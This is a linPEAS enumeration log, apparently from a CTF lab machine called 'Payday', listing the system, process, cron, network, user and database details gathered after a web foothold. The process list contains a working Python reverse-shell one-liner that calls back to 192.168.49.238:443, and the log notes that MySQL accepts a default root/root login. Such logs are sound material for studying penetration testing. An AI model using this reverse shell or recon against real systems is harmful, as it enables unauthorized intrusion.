@@ -1,0 +1,2094 @@
+root@kali:~/CTF/PGPractice/Payday/PE# cat linpeas.txt
+
+
+                     ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄             ▄▄▄▄▄▄▄▄▄
+      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄
+  ▄▄▄▄     ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄
+  ▄    ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄          ▄▄▄▄▄▄               ▄▄▄▄▄▄ ▄
+  ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄
+  ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
+  ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
+  ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
+  ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
+  ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
+  ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
+  ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄
+   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+  ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+   ▄▄▄▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄
+        ▄▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄
+             ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
+    linpeas v3.2.0 by carlospolop
+
+ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network owner's permission.
+
+Linux Privesc Checklist: https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist
+ LEGEND:
+  RED/YELLOW: 95% a PE vector
+  RED: You must take a look at it
+  LightCyan: Users with console
+  Blue: Users without console & mounted devs
+  Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs)
+  LightMagenta: Your username
+
+ Starting linpeas. Caching Writable Folders...
+
+════════════════════════════════════╣ Basic information ╠════════════════════════════════════
+OS: Linux version 2.6.22-14-server (buildd@palmer) (gcc version 4.1.3 20070929 (prerelease) (Ubuntu 4.1.2-16ubuntu2)) #1 SMP Sun Oct 14 23:34:23 GMT 2007
+User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Hostname: payday
+Writable folder: /dev/shm
+[+] /bin/ping is available for network discovery (linpeas can discover hosts, learn more with -h)
+[+] /bin/nc is available for network discover & port scanning (linpeas can discover hosts and scan ports, learn more with -h)
+
+
+Caching directories using 1 threads DONE
+
+════════════════════════════════════╣ System Information ╠════════════════════════════════════
+[+] Operative system
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#kernel-exploits
+Linux version 2.6.22-14-server (buildd@palmer) (gcc version 4.1.3 20070929 (prerelease) (Ubuntu 4.1.2-16ubuntu2)) #1 SMP Sun Oct 14 23:34:23 GMT 2007
+Distributor ID: Ubuntu
+Description:    Ubuntu 7.10
+Release:        7.10
+Codename:       gutsy
+
+[+] Sudo version
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-version
+Sudo version 1.6.8p12
+
+[+] USBCreator
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation
+
+[+] PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-path-abuses
+/usr/local/bin:/usr/bin:/bin
+New path exported: /usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin
+
+[+] Date
+Wed May 26 04:14:23 EDT 2021
+
+[+] System stats
+Filesystem            Size  Used Avail Use% Mounted on
+/dev/sda1             3.8G  1.3G  2.4G  35% /
+varrun                252M  188K  252M   1% /var/run
+varlock               252M     0  252M   0% /var/lock
+udev                  252M   48K  252M   1% /dev
+devshm                252M  424K  252M   1% /dev/shm
+             total       used       free     shared    buffers     cached
+Mem:        515740     392616     123124          0      20332     229880
+-/+ buffers/cache:     142404     373336
+Swap:       240932        204     240728
+
+[+] CPU info
+lscpu Not Found
+
+[+] Environment
+[i] Any private information inside environment variables?
+HISTFILESIZE=0
+SHLVL=1
+OLDPWD=/home/patrick
+PS1=\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[01;34m\] \w\$\[\033[00m\]
+_=./linpeas.sh
+TERM=xterm
+PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/sbin:/usr/sbin:/sbin
+HISTSIZE=0
+LANG=C
+LS_COLORS=no=00:fi=00:di=01;34:ln=01;36:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.gz=01;31:*.bz2=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.avi=01;35:*.fli=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.flac=01;35:*.mp3=01;35:*.mpc=01;35:*.ogg=01;35:*.wav=01;35:
+SHELL=bash
+PWD=/dev/shm
+HISTFILE=/dev/null
+LS_OPTIONS=--color=auto
+
+[+] Searching Signature verification failed in dmseg
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#dmesg-signature-verification-failed
+[    0.000000] ACPI: RSDP signature @ 0xC00F6A10 checksum 0
+
+[+] AppArmor enabled? .............. You do not have enough privilege to read the profile set.
+apparmor module is loaded.
+[+] grsecurity present? ............ grsecurity Not Found
+[+] PaX bins present? .............. PaX Not Found
+[+] Execshield enabled? ............ Execshield Not Found
+[+] SELinux enabled? ............... sestatus Not Found
+[+] Is ASLR enabled? ............... Yes
+[+] Printer? ....................... lpstat Not Found
+[+] Is this a virtual machine? ..... No
+
+═════════════════════════════════════════╣ Containers ╠══════════════════════════════════════════
+[+] Is this a container? ........... No
+
+[+] Container related tools present
+[+] Any running containers? ........ No
+
+═════════════════════════════════════════╣ Devices ╠══════════════════════════════════════════
+[+] Any sd*/disk* disk in /dev? (limit 20)
+disk
+sda
+sda1
+sda2
+sda5
+
+[+] Unmounted file-system?
+[i] Check if you can mount umounted devices
+proc            /proc           proc    defaults        0       0
+UUID=a6dc7a41-bac8-4650-b2e5-763c6c0f8711 /               ext3    defaults,errors=remount-ro 0       1
+UUID=37a75fb3-86c8-435d-a364-84f142c3b92e none            swap    sw              0       0
+/dev/scd0       /media/cdrom0   udf,iso9660 user,noauto,exec 0       0
+/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec 0       0
+
+
+════════════════════════════════════╣ Available Software ╠════════════════════════════════════
+[+] Useful software
+/bin/nc
+/bin/netcat
+/usr/bin/wget
+/bin/ping
+/usr/bin/python
+/usr/bin/perl
+/usr/bin/sudo
+
+[+] Installed Compiler
+
+
+══════════════════════════════╣ Processes, Cron, Services, Timers & Sockets ╠════════════════════════════════
+[+] Cleaned processes
+[i] Check weird & unexpected proceses run by root: https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+root         1  0.0  0.3   2952  1856 ?        Ss   01:17   0:00 /sbin/init
+root      2634  0.0  0.1   2332   752 ?        S<s  01:17   0:00 /sbin/udevd --daemon[0m
+root      4125  0.0  0.9  17824  4824 ?        Sl   01:17   0:00 /usr/sbin/vmtoolsd
+root      4154  0.0  1.4  13768  7672 ?        S    01:17   0:00 /usr/lib/vmware-vgauth/VGAuthService -s
+root      4392  0.0  0.1   1692   516 tty4     Ss+  01:17   0:00 /sbin/getty 38400 tty4
+root      4393  0.0  0.1   1696   520 tty5     Ss+  01:17   0:00 /sbin/getty 38400 tty5
+root      4396  0.0  0.1   1696   520 tty2     Ss+  01:17   0:00 /sbin/getty 38400 tty2
+root      4397  0.0  0.1   1692   516 tty3     Ss+  01:17   0:00 /sbin/getty 38400 tty3
+root      4400  0.0  0.1   1696   520 tty1     Ss+  01:17   0:00 /sbin/getty 38400 tty1
+root      4401  0.0  0.1   1692   516 tty6     Ss+  01:17   0:00 /sbin/getty 38400 tty6
+syslog    4442  0.0  0.1   1916   704 ?        Ss   01:17   0:00 /sbin/syslogd -u syslog
+root      4461  0.0  0.1   1836   536 ?        S    01:17   0:00 /bin/dd bs 1 if /proc/kmsg of /var/run/klogd/kmsg
+klog      4463  0.0  0.2   2500  1408 ?        Ss   01:17   0:00 /sbin/klogd -P /var/run/klogd/kmsg
+root      4542  0.0  0.1   1756   532 ?        S    01:17   0:00 /bin/sh /usr/bin/mysqld_safe
+mysql     4582  0.1  3.6 128432 18788 ?        Sl   01:17   0:12  _ /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=3306 --socket=/var/run/mysqld/mysqld.sock
+root      4583  0.0  0.1   1676   548 ?        S    01:17   0:00  _ logger -p daemon[0m.err -t mysqld_safe -i -t mysqld
+root      4656  0.0  0.4   9900  2280 ?        Ss   01:17   0:00 /usr/sbin/smbd -D
+root      4767  0.0  0.1   9900   916 ?        S    01:17   0:00  _ /usr/sbin/smbd -D
+root      4671  0.0  0.2   7988  1324 ?        Ss   01:17   0:00 /usr/sbin/winbindd
+root      4690  0.0  0.2   7988  1176 ?        S    01:17   0:00  _ /usr/sbin/winbindd
+root      4765  0.0  0.2   7996  1260 ?        S    01:17   0:00  _ /usr/sbin/winbindd
+root      4766  0.0  0.1   7988   880 ?        S    01:17   0:00  _ /usr/sbin/winbindd
+root      4694  0.0  0.1   2048   648 ?        Ss   01:17   0:00 /usr/sbin/dovecot
+root      4699  0.0  0.4   9336  2540 ?        S    01:17   0:00  _ dovecot-auth
+dovecot   5517  0.0  0.2   3464  1540 ?        S    02:16   0:00  _ pop3-login
+dovecot   5519  0.0  0.2   3460  1536 ?        S    02:16   0:00  _ pop3-login
+dovecot   5520  0.0  0.2   3464  1540 ?        S    02:16   0:00  _ pop3-login
+dovecot   5521  0.0  0.2   3460  1536 ?        S    02:16   0:00  _ pop3-login
+dovecot   5522  0.0  0.2   3464  1540 ?        S    02:16   0:00  _ pop3-login
+dovecot   5524  0.0  0.2   3468  1540 ?        S    02:16   0:00  _ imap-login
+dovecot   5525  0.0  0.2   3464  1536 ?        S    02:16   0:00  _ imap-login
+dovecot   5526  0.0  0.2   3464  1536 ?        S    02:16   0:00  _ imap-login
+dovecot   5527  0.0  0.2   3468  1540 ?        S    02:16   0:00  _ imap-login
+dovecot   5528  0.0  0.2   3468  1540 ?        S    02:16   0:00  _ imap-login
+daemon[0m    4708  0.0  0.0   1964   428 ?        Ss   01:17   0:00 /usr/sbin/atd
+root      4719  0.0  0.1   2336   912 ?        Ss   01:17   0:00 /usr/sbin/cron
+root      4741  0.0  1.2  21568  6228 ?        Ss   01:17   0:00 /usr/sbin/apache2 -k start
+www-data  6271  0.0  0.7  21568  3856 ?        S    02:48   0:01  _ /usr/sbin/apache2 -k start
+www-data  6676  0.0  1.6  23860  8620 ?        S    03:04   0:00  _ /usr/sbin/apache2 -k start
+www-data  7128  0.0  0.7  21568  3852 ?        S    03:23   0:00  _ /usr/sbin/apache2 -k start
+www-data  7182  0.0  0.7  21568  3852 ?        S    03:25   0:00  _ /usr/sbin/apache2 -k start
+www-data  7203  0.0  1.6  23864  8608 ?        S    03:26   0:00  _ /usr/sbin/apache2 -k start
+www-data  7221  0.0  0.7  21568  3852 ?        S    03:27   0:00  _ /usr/sbin/apache2 -k start
+www-data  7403  0.0  0.7  21568  3852 ?        S    03:35   0:00  _ /usr/sbin/apache2 -k start
+www-data  7410  0.0  0.8  21568  4416 ?        S    03:35   0:00  _ /usr/sbin/apache2 -k start
+www-data  7418  0.0  0.0   1752   488 ?        S    03:35   0:00  |   _ sh -c python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.238",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+www-data  7419  0.0  0.7   6240  3652 ?        S    03:35   0:00  |       _ python -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.238",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")
+www-data  7420  0.0  0.3   3424  1884 pts/0    Ss   03:35   0:00  |           _ /bin/bash
+www-data  7582  0.7  0.1   1944   816 pts/0    S+   04:14   0:00  |               _ /bin/sh ./linpeas.sh -a
+www-data  8245  0.0  0.0   1944   504 pts/0    R+   04:14   0:00  |               |   _ /bin/sh ./linpeas.sh -a
+www-data  8246  0.0  0.1   2340   928 pts/0    R+   04:14   0:00  |               |   |   _ ps fauxwww
+www-data  8249  0.0  0.0   1944   508 pts/0    S+   04:14   0:00  |               |   _ /bin/sh ./linpeas.sh -a
+www-data  7583  0.0  0.0   1684   436 pts/0    S+   04:14   0:00  |               _ tee linpeas.txt
+www-data  7448  0.0  0.7  21568  3852 ?        S    03:36   0:00  _ /usr/sbin/apache2 -k start
+www-data  7523  0.0  0.7  21568  3848 ?        S    03:39   0:00  _ /usr/sbin/apache2 -k start
+www-data  7543  0.0  0.7  21568  3844 ?        S    03:39   0:00  _ /usr/sbin/apache2 -k start
+root      4919  0.0  0.1   5280   992 ?        Ss   01:20   0:00 /usr/sbin/sshd
+
+[+] Binary processes permissions
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#processes
+-rwxr-xr-x 1 root root  701680 Oct  5  2007 /bin/bash
+-rwxr-xr-x 1 root root   38780 Sep 29  2007 /bin/dd
+lrwxrwxrwx 1 root root       4 Apr 24  2008 /bin/sh -> dash
+-rwxr-xr-x 1 root root   15104 Oct  3  2007 /sbin/getty
+-rwxr-xr-x 1 root root   88672 Sep 16  2007 /sbin/init
+-rwxr-xr-x 1 root root   22948 Sep 17  2007 /sbin/klogd
+-rwxr-xr-x 1 root root   31992 Sep 17  2007 /sbin/syslogd
+-rwxr-xr-x 1 root root   65672 Oct  5  2007 /sbin/udevd
+lrwxrwxrwx 1 root root      37 Jan 17  2018 /usr/lib/vmware-vgauth/VGAuthService -> /usr/lib/vmware-tools/bin32/appLoader
+-rwxr-xr-x 1 root root  344876 Oct  4  2007 /usr/sbin/apache2
+-rwxr-xr-x 1 root root   16040 Feb 20  2007 /usr/sbin/atd
+-rwxr-xr-x 1 root root   32192 Dec 20  2006 /usr/sbin/cron
+-rwxr-xr-x 1 root root  132652 Oct 15  2007 /usr/sbin/dovecot
+-rwxr-xr-x 1 root root 7239668 Oct 12  2007 /usr/sbin/mysqld
+-rwxr-xr-x 1 root root 3894524 Oct  4  2007 /usr/sbin/smbd
+-rwxr-xr-x 1 root root  368036 Oct  4  2007 /usr/sbin/sshd
+lrwxrwxrwx 1 root root      37 Jan 17  2018 /usr/sbin/vmtoolsd -> /usr/lib/vmware-tools/sbin32/vmtoolsd
+-rwxr-xr-x 1 root root 2592224 Oct  4  2007 /usr/sbin/winbindd
+
+[+] Files opened by processes belonging to other users
+[i] This is usually empty because of the lack of privileges to read other user processes information
+COMMAND    PID     USER   FD      TYPE DEVICE      SIZE   NODE NAME
+
+[+] Processes with credentials in memory (root req)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#credentials-from-process-memory
+gdm-password Not Found
+gnome-keyring-daemon Not Found
+lightdm Not Found
+vsftpd Not Found
+apache2 process found (dump creds from memory as root)
+sshd Not Found
+
+[+] Different processes executed during 1 min (interesting is low number of repetitions)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#frequent-cron-jobs
+
+[+] Cron jobs
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#scheduled-cron-jobs
+/usr/bin/crontab
+incrontab Not Found
+-rw-r--r-- 1 root root  724 Dec 20  2006 /etc/crontab
+
+/etc/cron.d:
+total 16
+drwxr-xr-x  2 root root 4096 Apr 24  2008 .
+drwxr-xr-x 70 root root 4096 Sep  9  2020 ..
+-rw-r--r--  1 root root  102 Dec 20  2006 .placeholder
+-rw-r--r--  1 root root  456 Oct  4  2007 php5
+
+/etc/cron.daily:
+total 56
+drwxr-xr-x  2 root root 4096 Apr 24  2008 .
+drwxr-xr-x 70 root root 4096 Sep  9  2020 ..
+-rw-r--r--  1 root root  102 Dec 20  2006 .placeholder
+-rwxr-xr-x  1 root root  633 Oct  4  2007 apache2
+-rwxr-xr-x  1 root root 5811 Oct 15  2007 apt
+-rwxr-xr-x  1 root root  314 Sep 15  2007 aptitude
+-rwxr-xr-x  1 root root  502 May 15  2007 bsdmainutils
+-rwxr-xr-x  1 root root  473 Oct  3  2007 find
+-rwxr-xr-x  1 root root   89 Jun 19  2006 logrotate
+-rwxr-xr-x  1 root root  946 May 23  2007 man-db
+-rwxr-xr-x  1 root root  383 Oct  4  2007 samba
+-rwxr-xr-x  1 root root 3283 Dec 20  2006 standard
+-rwxr-xr-x  1 root root 1309 Sep 17  2007 sysklogd
+
+/etc/cron.hourly:
+total 12
+drwxr-xr-x  2 root root 4096 Apr 24  2008 .
+drwxr-xr-x 70 root root 4096 Sep  9  2020 ..
+-rw-r--r--  1 root root  102 Dec 20  2006 .placeholder
+
+/etc/cron.monthly:
+total 16
+drwxr-xr-x  2 root root 4096 Apr 24  2008 .
+drwxr-xr-x 70 root root 4096 Sep  9  2020 ..
+-rw-r--r--  1 root root  102 Dec 20  2006 .placeholder
+-rwxr-xr-x  1 root root  129 Dec 20  2006 standard
+
+/etc/cron.weekly:
+total 24
+drwxr-xr-x  2 root root 4096 Apr 24  2008 .
+drwxr-xr-x 70 root root 4096 Sep  9  2020 ..
+-rw-r--r--  1 root root  102 Dec 20  2006 .placeholder
+-rwxr-xr-x  1 root root  520 May 23  2007 man-db
+-rwxr-xr-x  1 root root 1942 May 15  2007 popularity-contest
+-rwxr-xr-x  1 root root 1220 Sep 17  2007 sysklogd
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+
+
+
+[+] Services
+[i] Search for outdated versions
+service|chkconfig|rc-status|launchctl Not Found
+
+[+] Systemd PATH
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#systemd-path-relative-paths
+
+[+] Analyzing .service files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#services
+You can't write on systemd PATH
+
+[+] System timers
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+
+[+] Analyzing .timer files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#timers
+
+[+] Analyzing .socket files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] HTTP sockets
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sockets
+
+[+] D-Bus config files
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+
+[+] D-Bus Service Objects list
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#d-bus
+busctl Not Found
+
+
+═══════════════════════════════════╣ Network Information ╠════════════════════════════════════
+[+] Hostname, hosts and DNS
+payday
+127.0.0.1 localhost
+127.0.0.1 payday
+nameserver 192.168.238.254
+
+[+] Content of /etc/inetd.conf & /etc/xinetd.conf
+/etc/inetd.conf Not Found
+
+[+] Interfaces
+# symbolic names for networks, see networks(5) for more information
+link-local 169.254.0.0
+eth0      Link encap:Ethernet  HWaddr 00:50:56:BF:9F:DE
+          inet addr:192.168.238.39  Bcast:192.168.238.255  Mask:255.255.255.0
+          inet6 addr: fe80::250:56ff:febf:9fde/64 Scope:Link
+          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+          RX packets:2484440 errors:7 dropped:7 overruns:0 frame:0
+          TX packets:2433128 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:1000
+          RX bytes:391913196 (373.7 MB)  TX bytes:1252736622 (1.1 GB)
+          Interrupt:17 Base address:0x2000
+
+lo        Link encap:Local Loopback
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+          UP LOOPBACK RUNNING  MTU:16436  Metric:1
+          RX packets:17189 errors:0 dropped:0 overruns:0 frame:0
+          TX packets:17189 errors:0 dropped:0 overruns:0 carrier:0
+          collisions:0 txqueuelen:0
+          RX bytes:30098592 (28.7 MB)  TX bytes:30098592 (28.7 MB)
+
+
+[+] Networks and neighbours
+Kernel IP routing table
+Destination     Gateway         Genmask         Flags Metric Ref    Use Iface
+192.168.238.0   *               255.255.255.0   U     0      0        0 eth0
+default         192.168.238.254 0.0.0.0         UG    100    0        0 eth0
+Address                  HWtype  HWaddress           Flags Mask            Iface
+192.168.238.254          ether   00:50:56:9F:DF:AB   C                     eth0
+
+[+] Iptables rules
+iptables rules Not Found
+
+[+] Active Ports
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports
+tcp        0      0 0.0.0.0:993             0.0.0.0:*               LISTEN     -
+tcp        0      0 0.0.0.0:995             0.0.0.0:*               LISTEN     -
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     -
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN     -
+tcp        0      0 0.0.0.0:110             0.0.0.0:*               LISTEN     -
+tcp        0      0 0.0.0.0:143             0.0.0.0:*               LISTEN     -
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN     -
+tcp6       0      0 :::80                   :::*                    LISTEN     7418/sh
+tcp6       0      0 :::22                   :::*                    LISTEN     -
+
+[+] Can I sniff with tcpdump?
+No
+
+
+════════════════════════════════════╣ Users Information ╠════════════════════════════════════
+[+] My user
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#users
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+[+] Do I have PGP keys?
+/usr/bin/gpg
+netpgpkeys Not Found
+netpgp Not Found
+
+[+] Clipboard or highlighted text?
+xsel and xclip Not Found
+
+[+] Checking 'sudo -l', /etc/sudoers, and /etc/sudoers.d
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#sudo-and-suid
+
+[+] Checking sudo tokens
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#reusing-sudo-tokens
+/proc/sys/kernel/yama/ptrace_scope is not enabled ()
+gdb wasn't found in PATH
+
+[+] Checking doas.conf
+/etc/doas.conf Not Found
+
+[+] Checking Pkexec policy
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe#pe-method-2
+
+[+] Superusers
+root:x:0:0:root:/root:/bin/bash
+
+[+] Users with console
+backup:x:34:34:backup:/var/backups:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+games:x:5:60:games:/usr/games:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+patrick:x:1000:1000:patrick,,,:/home/patrick:/bin/bash
+proxy:x:13:13:proxy:/bin:/bin/sh
+root:x:0:0:root:/root:/bin/bash
+sys:x:3:3:sys:/dev:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+
+[+] All users & groups
+uid=0(root) gid=0(root) groups=0(root)
+uid=1(daemon[0m) gid=1(daemon[0m) groups=1(daemon[0m)
+uid=10(uucp) gid=10(uucp) groups=10(uucp)
+uid=100(dhcp) gid=101(dhcp) groups=101(dhcp)
+uid=1000(patrick) gid=1000(patrick) groups=1000(patrick),4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),104(scanner),115(lpadmin)
+uid=101(syslog) gid=102(syslog) groups=102(syslog)
+uid=102(klog) gid=103(klog) groups=103(klog)
+uid=103(mysql) gid=107(mysql) groups=107(mysql)
+uid=104(dovecot) gid=111(dovecot) groups=111(dovecot),8(mail)
+uid=105(postfix) gid=112(postfix) groups=112(postfix)
+uid=106(sshd) gid=65534(nogroup) groups=65534(nogroup)
+uid=13(proxy) gid=13(proxy) groups=13(proxy)
+uid=2(bin) gid=2(bin) groups=2(bin)
+uid=3(sys) gid=3(sys) groups=3(sys)
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+uid=34(backup) gid=34(backup) groups=34(backup)
+uid=38(list) gid=38(list) groups=38(list)
+uid=39(irc) gid=39(irc) groups=39(irc)
+uid=4(sync) gid=65534(nogroup) groups=65534(nogroup)
+uid=41(gnats) gid=41(gnats) groups=41(gnats)
+uid=5(games) gid=60(games) groups=60(games)
+uid=6(man) gid=12(man) groups=12(man)
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+uid=7(lp) gid=7(lp) groups=7(lp)
+uid=8(mail) gid=8(mail) groups=8(mail)
+uid=9(news) gid=9(news) groups=9(news)
+
+[+] Login now
+ 04:16:12 up  2:58,  0 users,  load average: 0.08, 0.03, 0.01
+USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
+
+[+] Last logons
+reboot   system boot  2.6.22-14-server Wed Sep  9 16:40 - 04:16 (258+11:36)
+
+wtmp begins Thu Sep  3 08:57:44 2020
+
+[+] Last time logon each user
+
+[+] Password policy
+PASS_MAX_DAYS   99999
+PASS_MIN_DAYS   0
+PASS_WARN_AGE   7
+
+[+] Do not forget to test 'su' as any other user with shell: without password and with their names as password (I can't do it...)
+[+] Do not forget to execute 'sudo -l' without password or with valid password (if you know it)!!
+
+
+═══════════════════════════════════╣ Software Information ╠═══════════════════════════════════
+[+] MySQL version
+mysql  Ver 14.12 Distrib 5.0.45, for pc-linux-gnu (i486) using readline 5.2
+
+[+] MySQL connection using default root/root ........... Yes
+[+] MySQL connection using root/toor ................... No
+[+] MySQL connection using root/NOPASS ................. No
+[+] Searching mysql credentials and exec
+Found readable /etc/mysql/my.cnf
+[client]
+port            = 3306
+socket          = /var/run/mysqld/mysqld.sock
+[mysqld_safe]
+socket          = /var/run/mysqld/mysqld.sock
+nice            = 0
+[mysqld]
+user            = mysql
+pid-file        = /var/run/mysqld/mysqld.pid
+socket          = /var/run/mysqld/mysqld.sock
+port            = 3306
+basedir         = /usr
+datadir         = /var/lib/mysql
+tmpdir          = /tmp
+language        = /usr/share/mysql/english
+skip-external-locking
+bind-address            = 127.0.0.1
+key_buffer              = 16M
+max_allowed_packet      = 16M
+thread_stack            = 128K
+thread_cache_size       = 8
+query_cache_limit       = 1M
+query_cache_size        = 16M
+log_bin                 = /var/log/mysql/mysql-bin.log
+expire_logs_days        = 10
+max_binlog_size         = 100M
+skip-bdb
+[mysqldump]
+quick
+quote-names
+max_allowed_packet      = 16M
+[mysql]
+[isamchk]
+key_buffer              = 16M
+!includedir /etc/mysql/conf.d/
+
+[+] PostgreSQL version and pgadmin credentials
+ Not Found
+
+[+] Apache server info
+Version: Server version: Apache/2.2.4 (Ubuntu)
+Server built:   Oct  4 2007 22:47:20
+PHP exec extensions
+/etc/apache2/mods-available/php5.conf-<IfModule mod_php5.c>
+/etc/apache2/mods-available/php5.conf:  AddType application/x-httpd-php .php .phtml .php3
+/etc/apache2/mods-available/php5.conf:  AddType application/x-httpd-php-source .phps
+--
